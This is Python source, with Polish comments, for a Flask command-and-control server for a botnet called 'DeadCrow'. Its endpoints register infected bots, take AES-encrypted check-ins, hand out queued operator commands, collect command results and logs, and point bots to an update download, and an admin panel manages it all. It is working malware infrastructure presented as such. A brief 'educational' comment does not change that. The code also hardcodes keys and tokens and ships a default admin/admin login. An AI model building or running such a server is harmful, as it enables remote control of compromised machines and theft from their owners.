# C2 Server for DeadCrow

from flask import Flask, request, jsonify, render_template, redirect, url_for, session
import sqlite3
import os
import json
import base64
import hashlib
import datetime
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Konfiguracja bazy danych
DATABASE = 'db.sqlite3'
AES_KEY = b'DeadCr0wSecretK3y123456789012345'  # 32 bajtów (256 bitów)

# Inicjalizacja bazy danych
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        
        # Tabela botów
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT UNIQUE NOT NULL,
            system_info TEXT,
            ip TEXT,
            geo TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            tags TEXT,
            status TEXT DEFAULT 'active'
        )
        ''')
        
        # Tabela komend
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP,
            result TEXT
        )
        ''')
        
        # Tabela logów
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT,
            log_type TEXT NOT NULL,
            log_data TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # Tabela użytkowników panelu
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        
        # Dodaj domyślnego użytkownika admin/admin
        admin_password_hash = hashlib.sha256('admin'.encode()).hexdigest()
        cursor.execute('INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)',
                      ('admin', admin_password_hash, 'admin'))
        
        conn.commit()

# Funkcje pomocnicze do szyfrowania/deszyfrowania
def encrypt_data(data):
    if isinstance(data, dict) or isinstance(data, list):
        data = json.dumps(data)
    
    if isinstance(data, str):
        data = data.encode('utf-8')
    
    cipher = AES.new(AES_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return json.dumps({'iv': iv, 'data': ct})

def decrypt_data(encrypted_data):
    try:
        data = json.loads(encrypted_data)
        iv = base64.b64decode(data['iv'])
        ct = base64.b64decode(data['data'])
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        print(f"Błąd deszyfrowania: {e}")
        return None

# Middleware do autoryzacji API
def require_api_auth(f):
    def decorated(*args, **kwargs):
        # W rzeczywistej implementacji należałoby dodać bardziej zaawansowaną autoryzację
        # Na potrzeby edukacyjne używamy prostego tokena
        auth_header = request.headers.get('Authorization')
        if auth_header != 'Bearer DeadCrowAPIToken':
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Middleware do autoryzacji panelu
def require_panel_auth(f):
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Endpoint do rejestracji bota
@app.route('/join', methods=['POST'])
def join():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Deszyfruj dane
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        data = json.loads(decrypted_data)
        
        # Zapisz dane bota do bazy
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
            INSERT OR REPLACE INTO bots (bot_id, system_info, ip, geo, last_seen)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (data['bot_id'], data['system_info'], data['ip'], data.get('geo', 'Unknown')))
            conn.commit()
        
        # Przygotuj odpowiedź
        response = {'status': 'success', 'message': 'Bot registered successfully'}
        encrypted_response = encrypt_data(response)
        
        return jsonify({'data': encrypted_response})
    
    except Exception as e:
        print(f"Błąd podczas rejestracji bota: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

# Endpoint do pingowania
@app.route('/ping', methods=['POST'])
def ping():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Deszyfruj dane
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        data = json.loads(decrypted_data)
        
        # Aktualizuj ostatnią aktywność bota
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
            UPDATE bots SET last_seen = CURRENT_TIMESTAMP WHERE bot_id = ?
            ''', (data['bot_id'],))
            conn.commit()
        
        # Sprawdź, czy są oczekujące komendy
        pending_commands = []
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
            SELECT id, command_type, command_data FROM commands
            WHERE bot_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            ''', (data['bot_id'],))
            
            for cmd_id, cmd_type, cmd_data in cursor.fetchall():
                pending_commands.append({
                    'id': cmd_id,
                    'type': cmd_type,
                    'data': cmd_data
                })
                
                # Oznacz komendę jako wysłaną
                cursor.execute('''
                UPDATE commands SET status = 'sent' WHERE id = ?
                ''', (cmd_id,))
            
            conn.commit()
        
        # Przygotuj odpowiedź
        response = {
            'status': 'success',
            'message': 'Ping received',
            'commands': pending_commands
        }
        encrypted_response = encrypt_data(response)
        
        return jsonify({'data': encrypted_response})
    
    except Exception as e:
        print(f"Błąd podczas pingowania: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

# Endpoint do sprawdzania aktualizacji
@app.route('/check_update', methods=['POST'])
def check_update():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Deszyfruj dane
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        data = json.loads(decrypted_data)
        
        # Sprawdź, czy jest dostępna aktualizacja
        current_version = data['current_version']
        latest_version = "1.0.0"  # W rzeczywistej implementacji pobierz z bazy lub pliku konfiguracyjnego
        
        # Przygotuj odpowiedź
        response = {
            'status': 'success',
            'latest_version': latest_version,
            'download_url': 'https://example.com/deadcrow_update.exe'  # W rzeczywistej implementacji użyj prawdziwego URL
        }
        encrypted_response = encrypt_data(response)
        
        return jsonify({'data': encrypted_response})
    
    except Exception as e:
        print(f"Błąd podczas sprawdzania aktualizacji: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

# Endpoint do raportowania wyników komend
@app.route('/report', methods=['POST'])
def report():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Deszyfruj dane
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        data = json.loads(decrypted_data)
        
        # Zapisz wynik komendy
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
            UPDATE commands SET status = 'executed', executed_at = CURRENT_TIMESTAMP, result = ?
            WHERE id = ?
            ''', (data['result'], data['command_id']))
            conn.commit()
        
        # Przygotuj odpowiedź
        response = {'status': 'success', 'message': 'Report received'}
        encrypted_response = encrypt_data(response)
        
        return jsonify({'data': encrypted_response})
    
    except Exception as e:
        print(f"Błąd podczas raportowania: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

# Endpoint do wysyłania logów
@app.route('/log', methods=['POST'])
def log():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Deszyfruj dane
        decrypted_data = decrypt_data(encrypted_data)
        if not decrypted_data:
            return jsonify({'status': 'error', 'message': 'Invalid data'}), 400
        
        data = json.loads(decrypted_data)
        
        # Zapisz log
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
            INSERT INTO logs (bot_id, log_type, log_data)
            VALUES (?, ?, ?)
            ''', (data['bot_id'], data['log_type'], data['log_data']))
            conn.commit()
        
        # Przygotuj odpowiedź
        response = {'status': 'success', 'message': 'Log received'}
        encrypted_response = encrypt_data(response)
        
        return jsonify({'data': encrypted_response})
    
    except Exception as e:
        print(f"Błąd podczas logowania: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

# Panel administracyjny - logowanie
@app.route('/panel/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            return render_template('login.html', error='Wprowadź nazwę użytkownika i hasło')
        
        # Sprawdź dane logowania
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        with sqlite3.connect(DATABASE) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT id, role FROM users WHERE username = ? AND password_hash = ?',
                          (username, password_hash))
            user = cursor.fetchone()
            
            if user:
                session['user_id'] = user[0]
                session['role'] = user[1]
                return redirect(url_for('dashboard'))
            else:
                return render_template('login.html', error='Nieprawidłowa nazwa użytkownika lub hasło')
    
    return render_template('login.html')

# Panel administracyjny - wylogowanie
@app.route('/panel/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Panel administracyjny - dashboard
@app.route('/panel')
@require_panel_auth
def dashboard():
    # Pobierz statystyki
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        
        # Liczba aktywnych botów
        cursor.execute('SELECT COUNT(*) FROM bots WHERE status = "active"')
        active_bots = cursor.fetchone()[0]
        
        # Liczba botów online (aktywnych w ciągu ostatnich 10 minut)
        cursor.execute('SELECT COUNT(*) FROM bots WHERE last_seen > datetime("now", "-10 minutes")')
        online_bots = cursor.fetchone()[0]
        
        # Liczba oczekujących komend
        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
        pending_commands = cursor.fetchone()[0]
        
        # Ostatnie logi
        cursor.execute('''
        SELECT logs.id, bots.bot_id, logs.log_type, logs.created_at
        FROM logs
        JOIN bots ON logs.bot_id = bots.bot_id
        ORDER BY logs.created_at DESC
        LIMIT 10
        ''')
        recent_logs = cursor.fetchall()
    
    return render_template('dashboard.html',
                          active_bots=active_bots,
                          online_bots=online_bots,
                          pending_commands=pending_commands,
                          recent_logs=recent_logs)

# Panel administracyjny - lista botów
@app.route('/panel/bots')
@require_panel_auth
def bots():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
        SELECT bot_id, system_info, ip, geo, first_seen, last_seen, tags, status
        FROM bots
        ORDER BY last_seen DESC
        ''')
        bots = cursor.fetchall()
    
    return render_template('bots.html', bots=bots)

# Panel administracyjny - szczegóły bota
@app.route('/panel/bots/<bot_id>')
@require_panel_auth
def bot_details(bot_id):
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        
        # Pobierz informacje o bocie
        cursor.execute('SELECT * FROM bots WHERE bot_id = ?', (bot_id,))
        bot = cursor.fetchone()
        
        if not bot:
            return redirect(url_for('bots'))
        
        # Pobierz komendy bota
        cursor.execute('''
        SELECT id, command_type, command_data, status, created_at, executed_at, result
        FROM commands
        WHERE bot_id = ?
        ORDER BY created_at DESC
        ''', (bot_id,))
        commands = cursor.fetchall()
        
        # Pobierz logi bota
        cursor.execute('''
        SELECT id, log_type, log_data, created_at
        FROM logs
        WHERE bot_id = ?
        ORDER BY created_at DESC
        ''', (bot_id,))
        logs = cursor.fetchall()
    
    return render_template('bot_details.html', bot=bot, commands=commands, logs=logs)

# Panel administracyjny - wysyłanie komendy
@app.route('/panel/send_command', methods=['POST'])
@require_panel_auth
def send_command():
    bot_id = request.form.get('bot_id')
    command_type = request.form.get('command_type')
    command_data = request.form.get('command_data')
    
    if not bot_id or not command_type or not command_data:
        return redirect(url_for('bots'))
    
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO commands (bot_id, command_type, command_data)
        VALUES (?, ?, ?)
        ''', (bot_id, command_type, command_data))
        conn.commit()
    
    return redirect(url_for('bot_details', bot_id=bot_id))

# Panel administracyjny - zarządzanie użytkownikami
@app.route('/panel/users')
@require_panel_auth
def users():
    # Sprawdź, czy użytkownik ma uprawnienia administratora
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, role, created_at FROM users')
        users = cursor.fetchall()
    
    return render_template('users.html', users=users)

# Panel administracyjny - dodawanie użytkownika
@app.route('/panel/users/add', methods=['POST'])
@require_panel_auth
def add_user():
    # Sprawdź, czy użytkownik ma uprawnienia administratora
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    
    username = request.form.get('username')
    password = request.form.get('password')
    role = request.form.get('role')
    
    if not username or not password or not role:
        return redirect(url_for('users'))
    
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
        INSERT INTO users (username, password_hash, role)
        VALUES (?, ?, ?)
        ''', (username, password_hash, role))
        conn.commit()
    
    return redirect(url_for('users'))

# Panel administracyjny - usuwanie użytkownika
@app.route('/panel/users/delete/<int:user_id>')
@require_panel_auth
def delete_user(user_id):
    # Sprawdź, czy użytkownik ma uprawnienia administratora
    if session.get('role') != 'admin':
        return redirect(url_for('dashboard'))
    
    # Nie pozwól na usunięcie własnego konta
    if user_id == session.get('user_id'):
        return redirect(url_for('users'))
    
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM users WHERE id = ?', (user_id,))
        conn.commit()
    
    return redirect(url_for('users'))

# Inicjalizacja bazy danych przy starcie
@app.before_first_request
def before_first_request():
    init_db()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
